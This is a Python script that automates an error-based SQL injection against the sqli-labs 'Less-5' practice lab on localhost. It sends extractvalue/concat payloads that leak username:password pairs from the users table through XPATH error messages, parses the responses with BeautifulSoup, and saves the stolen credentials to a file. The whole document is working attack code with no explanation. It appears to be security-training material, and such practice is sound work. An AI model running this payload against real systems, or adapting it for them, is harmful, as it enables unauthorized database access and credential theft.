import requests
from bs4 import BeautifulSoup

base_url = "http://localhost/sqli-labs/Less-5/?id=1%27%20and%20extractvalue(0x0a,concat(0x0a,(select%20concat(username,%27:%27,password)%20from%20users%20limit%20"
table_names = []

for i in range(13):
    url = f"{base_url}{i},1)))--+"
    #print(url)
    response = requests.get(url)

    soup = BeautifulSoup(response.text, 'html.parser')
    error_div = soup.find('div', style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center")

    if error_div:
        # Find the text within the div and extract what is after "XPATH syntax error:"
        error_text = error_div.find('font', color="#FFFF00").get_text()
        
        # Check if the error message contains the expected pattern
        if "XPATH syntax error:" in error_text:
            table_name = error_text.split("XPATH syntax error:")[1].strip()
            table_names.append(table_name)
            #print(table_name)
with open('names.txt', 'w') as file:
    for table_name in table_names:
        file.write(table_name + '\n')
